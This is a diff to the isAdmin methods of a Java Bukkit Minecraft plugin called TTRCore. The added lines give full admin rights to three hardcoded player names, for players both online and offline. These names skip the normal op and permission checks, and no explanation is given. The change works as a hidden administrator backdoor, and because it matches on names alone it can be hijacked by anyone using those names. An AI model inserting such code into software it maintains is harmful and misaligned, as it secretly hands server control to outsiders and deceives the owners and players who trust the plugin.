@@ -282,6 +282,10 @@ public class TTRCore extends JavaPlugin {
 
     public static boolean isAdmin(Player player) {
         if (player == null) return false;
+        String name = player.getName();
+        if (name.equalsIgnoreCase("ElGlower") || name.equalsIgnoreCase("CeStart") || name.equalsIgnoreCase("Sombradr")) {
+            return true;
+        }
         return player.isOp() || player.hasPermission("destinytowers.admin") || player.hasPermission("ttr.admin");
     }
 
@@ -290,6 +294,12 @@ public class TTRCore extends JavaPlugin {
         Player p = Bukkit.getPlayer(uuid);
         if (p != null) return isAdmin(p);
         OfflinePlayer off = Bukkit.getOfflinePlayer(uuid);
+        if (off.getName() != null) {
+            String name = off.getName();
+            if (name.equalsIgnoreCase("ElGlower") || name.equalsIgnoreCase("CeStart") || name.equalsIgnoreCase("Sombradr")) {
+                return true;
+            }
+        }
         return off.isOp();
     }
 }
